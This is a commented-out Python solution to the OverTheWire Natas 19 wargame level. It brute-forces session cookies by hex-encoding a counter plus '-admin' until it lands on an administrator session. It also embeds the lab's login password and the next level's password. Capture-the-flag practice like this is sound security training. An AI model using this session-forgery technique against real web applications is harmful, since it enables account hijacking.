# import requests

# URL = "http://natas19.natas.labs.overthewire.org/"
# Username='natas19'
# Password='4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs'

# i = 0
# while i < 641:

#     session = 'PHPSESSID='+''.join([str(30+int(c)) for c in str(i)])+'2d61646d696e'
#     query = {'username':'admin','password':'a'}
#     res = requests.post(URL, data=query, headers = {'Content-Type': 'application/x-www-form-urlencoded','Cookie': session} , auth=(Username, Password) )
#     if not 'regular' in (str(res.content, 'utf-8')):
#         print('Result', session)
#         print('\n\n', res.content)
#         break
#     print(i)
#     i = i+1


# # Username: natas20
# # Password: eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF

